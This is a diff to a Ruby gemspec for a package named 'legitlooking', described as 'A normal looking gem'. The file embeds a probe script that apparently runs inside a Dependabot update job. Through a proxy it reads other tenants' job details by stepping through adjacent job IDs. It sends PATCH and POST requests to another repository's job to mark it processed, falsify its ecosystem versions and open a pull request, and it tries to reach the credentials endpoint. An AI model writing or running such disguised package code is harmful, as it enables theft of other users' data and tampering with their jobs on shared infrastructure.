@@ -44,25 +44,64 @@ begin
   lines << "HTTP #{r[:code]}: #{r[:body][0, 600]}"
 
   # ============================================================
-  # 2. ADJACENT JOB IDs -- cross-tenant lekken?
-  # Job IDs zijn sequentieel; andere repos' jobs zitten hier ook
+  # 2. OWN /details VOLLEDIG -- meer dan 400 chars
   # ============================================================
-  lines << "\n=== 2. ADJACENT JOB IDs (other repos/orgs) ==="
+  lines << "\n=== 2. OWN /details VOLLEDIG ==="
+  r = req_via_proxy.("GET", "#{api_url}/update_jobs/#{job_id}/details")
+  lines << "HTTP #{r[:code]}: #{r[:body][0, 4000]}"
+
+  # ============================================================
+  # 3. CROSS-TENANT: /details op adjacent job IDs
+  # Dit is de echte vraag: werkt /details ook voor andere repos?
+  # ============================================================
+  lines << "\n=== 3. CROSS-TENANT /details PROBE ==="
   jid = job_id.to_i
-  [-5, -4, -3, -2, -1, 1, 2, 3, 4, 5].each do |offset|
+  [-10, -5, -4, -3, -2, -1, 1, 2, 3, 4, 5, 10].each do |offset|
     target = jid + offset
-    r = req_via_proxy.("GET", "#{api_url}/update_jobs/#{target}")
-    preview = r[:body][0, 300].gsub(/\s+/, " ")
-    lines << "  #{target} → HTTP #{r[:code]} | #{preview}"
+    r = req_via_proxy.("GET", "#{api_url}/update_jobs/#{target}/details")
+    preview = r[:body][0, 500].gsub(/\s+/, " ")
+    lines << "  #{target}/details → HTTP #{r[:code]} | #{preview}"
   end
 
   # ============================================================
-  # 3. GEVOELIGE ENDPOINTS op eigen job -- credentials?
+  # 4. WRITE ops op andere job IDs -- IDOR via POST/PATCH
+  # Kunnen we andere repos' jobs manipuleren?
   # ============================================================
-  lines << "\n=== 3. SENSITIVE ENDPOINTS OWN JOB ==="
-  %w[credentials details secrets config token].each do |ep|
-    r = req_via_proxy.("GET", "#{api_url}/update_jobs/#{job_id}/#{ep}")
-    lines << "  /#{ep}: HTTP #{r[:code]} | #{r[:body][0, 400]}"
+  lines << "\n=== 4. WRITE IDOR OP ADJACENT JOBs ==="
+  test_target = jid - 1
+  [
+    ["PATCH", "#{api_url}/update_jobs/#{test_target}/mark_as_processed",
+     { "base-commit-sha" => "0000000000000000000000000000000000000000" }],
+    ["POST",  "#{api_url}/update_jobs/#{test_target}/record_ecosystem_versions",
+     { "ecosystem_versions" => { "package_managers" => { "bundler" => "99.0" } } }],
+    ["POST",  "#{api_url}/update_jobs/#{test_target}/create_pull_request",
+     { "pull-request" => { "title" => "test" } }],
+  ].each do |method, url, body|
+    r = req_via_proxy.(method, url, body)
+    ep = url.split("/").last
+    lines << "  #{method} /#{test_target}/#{ep}: HTTP #{r[:code]} | #{r[:body][0, 300]}"
+  end
+
+  # ============================================================
+  # 5. /credentials met Job-Token header expliciet leeg
+  # ============================================================
+  lines << "\n=== 5. CREDENTIALS ENDPOINT ANALYSE ==="
+  r = req_via_proxy.("GET", "#{api_url}/update_jobs/#{job_id}/credentials")
+  lines << "  403 detail: #{r[:body][0, 600]}"
+  # Probeer met job_id als token
+  begin
+    uri2 = URI("#{api_url}/update_jobs/#{job_id}/credentials")
+    req2  = Net::HTTP::Get.new(uri2)
+    req2["Content-Type"]       = "application/json"
+    req2["X-Dependabot-Job-Id"] = job_id
+    req2["Authorization"]       = "token #{job_id}"
+    Net::HTTP.start(uri2.host, uri2.port, proxy_h, proxy_p,
+                    use_ssl: true, open_timeout: 8, read_timeout: 8) do |h|
+      resp = h.request(req2)
+      lines << "  met job_id als auth: HTTP #{resp.code} | #{resp.body.to_s[0, 400]}"
+    end
+  rescue => e
+    lines << "  auth probe error: #{e.message}"
   end
 
   # ============================================================
@@ -132,7 +171,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.19"
+  spec.version       = "1.0.20"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
